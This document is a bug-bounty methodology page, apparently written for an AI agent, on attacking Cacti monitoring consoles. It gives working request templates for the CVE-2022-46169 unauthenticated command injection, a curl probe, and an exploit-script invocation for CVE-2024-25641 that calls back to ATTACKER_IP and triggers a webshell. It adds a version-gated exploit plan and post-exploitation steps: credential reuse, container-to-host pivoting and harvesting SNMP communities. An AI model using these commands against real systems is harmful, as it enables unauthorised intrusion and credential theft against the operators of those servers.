---
technology: "Cacti"
kind: bug-bounty-methodology
audience: ai-agent
family: network-services
role: implementation-variant
layer: graphing/monitoring framework (PHP web console + poller; HTTP, often containerized)
homepage: "https://www.cacti.net"
github-repo: "Cacti/cacti"
status: confirmed
provenance: "corpus-grounded (strict gate 2026-11-12: 4 writeup files with Cacti command-context evidence — unauthenticated remote_agent.php command injection, package-import arbitrary file write, graph-template RCE, an older authenticated host.php reindex command injection; evidence classes in internal coverage ledger) + upstream-verified (NVD CVE-2022-46169, NVD CVE-2024-25641, NVD CVE-2025-24367 / GHSA-fxrq-fr7h-9rqq). Companion area router: [[monitoring|Monitoring platforms]]. Enrichment pass 2 new-unit wave A, 2026-11-12."
---

# Cacti — implementation methodology

Companion router: [[monitoring|Monitoring platforms area router]]. This page covers
Cacti: the poller that shells out, the unauthenticated endpoint that used to guard
it, and the authenticated package/graph import paths that keep shipping file-write
RCEs.

Target model: Cacti console on HTTP ("Login to Cacti" page), version printed under
the login box, MySQL backend (cross-ref [[mysql]]), poller process running as root or
in a privileged container. Cacti is often the second console on a box whose first
service leaked credentials — always replay database creds against the Cacti login.

## Triage table

| Surface | Gate | Pre-auth? | Payoff |
|---|---|---|---|
| CVE-2022-46169 remote_agent.php | Cacti < 1.2.23 (1.2.2–1.2.22) + reachable poller | yes | Command injection → RCE as poller user — Critical |
| CVE-2024-25641 Package Import | Cacti < 1.2.27, authenticated | no | Arbitrary file write → PHP webshell — Critical |
| CVE-2025-24367 graph/template creation | Cacti < 1.2.29, authenticated | no | Arbitrary PHP file creation → RCE — Critical |
| host.php reindex command injection | legacy 1.2.x builds, authenticated | no | Command execution via poller args (older chain, verify version) |
| Login with harvested DB creds | any version | creds | Console admin when the app user is reused |
| Version disclosure | default login page | yes | CVE gate — Info |

## Phase 0 — Fingerprint and version gate

The login page prints the full version below the form ("Cacti Version 1.2.26"). That
single line picks the exploit:

- **< 1.2.23** → CVE-2022-46169 (unauthenticated)
- **< 1.2.27** → CVE-2024-25641 (authenticated package import)
- **< 1.2.29** → CVE-2025-24367 (authenticated graph templates)

## Phase 1 — CVE-2022-46169: unauthenticated command injection (Sonar-found)

`remote_agent.php` was meant for poller-to-poller communication with a
hostname-approval check; the check is bypassable with crafted `X-Forwarded-For`
header values, and the `poller_id` parameter flows into `proc_open` unvalidated:

```bash
# 1. Bypass the "authorized poller" gate by claiming to be the requested host
GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=<cmd>
X-Forwarded-For: 127.0.0.1
# 2. poller_id carries the payload into proc_open, e.g. a URL-encoded curl|bash
```

Pre-auth RCE as the web/poller user. One observed chain landed inside a container and
pivoted from there to the host. Verify the version gates against the vendor advisory
before firing (fixed in 1.2.23).

## Phase 2 — CVE-2024-25641: Package Import arbitrary file write

Authenticated feature abuse: the **Package Import** (Import/Export → Packages)
unpacks attacker-supplied package archives without safe path handling — a file
written as `.php` inside the web tree is a webshell (NVD: arbitrary file write,
exploitable through "Package Import", fixed 1.2.27). Public exploit scripts take
`-u user -p pass` and drop a shell payload; then trigger it over HTTP:

```bash
python3 exploit_cacti_25641.py -u admin -p 'reused-password' -url \
  http://198.51.100.10 -i ATTACKER_IP -l 4444
curl http://198.51.100.10/shell.php   # or listen for the callback
```

Reaching "authenticated" is the whole game — replay credentials harvested from the
host's SQL layer (one observed deployment shared its database password between the
Cacti DB user and the console admin).

## Phase 3 — CVE-2025-24367: graph template → PHP creation

The successor bug in spirit: an authenticated Cacti user with graph/template
privileges can abuse **graph creation and graph template functionality to create
arbitrary PHP scripts** in reachable paths (GHSA-fxrq-fr7h-9rqq, fixed 1.2.29; a
metasploit module exists for < 1.2.29). Same entry requirement as Phase 2, newer
installs. Lesson to carry: treat every Cacti "import/template" surface as a
file-write primitive until version-gated otherwise — this product line has repeated
the class (package import 2024, graph template 2025).

## Phase 4 — Legacy and adjacent surfaces

- **Authenticated host.php reindex command injection**: older 1.2.x builds let
  authenticated users reach a reindex path (`/cacti/host.php?action=reindex`) that
  lands in poller shell execution; observed in the field on unpatched 1.2-era
  installs. No CVE number is attached to this legacy chain — pin the version
  against vendor changelogs before using it.
- **Config path exposure**: Cacti's `include/config.php` holds the MySQL DSN — any
  file-read primitive on the host pays twice (DB creds → console login → Phase 2/3).
- **Poller-adjacent binaries**: deployments bundle `spine`, `poller.php`, and image
  tooling — cron-run scripts touching web-writable directories are the classic
  container-escape-into-host pivot after the initial RCE.

## Phase 5 — Post-exploitation

Cacti runs its poller as root on classic installs and privileged on containerized
ones; check the effective user immediately. The database behind Cacti holds user
hashes (reusable against other consoles) and the full device inventory with SNMP
communities — feed those back into the router's credential-reuse pattern
([[monitoring|monitoring router]]), and into [[snmp]].

## Command quick reference

```bash
curl -s 'http://198.51.100.10/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=id' \
  -H 'X-Forwarded-For: 127.0.0.1'          # CVE-2022-46169 probe (output = injection works)
mysql -h 198.51.100.10 -u cactiuser -p     # after config.php read
```

## Tool mapping (prose)

curl and a browser for the console and endpoint probing; sqlmap for the SQL-layer
surfaces when reachable; public exploit scripts and metasploit modules for the three
CVEs (all have packaged PoCs); exiftool-style metadata tooling irrelevant here —
Cacti's surface is its PHP endpoints and poller. Tools vault owns per-tool detail.
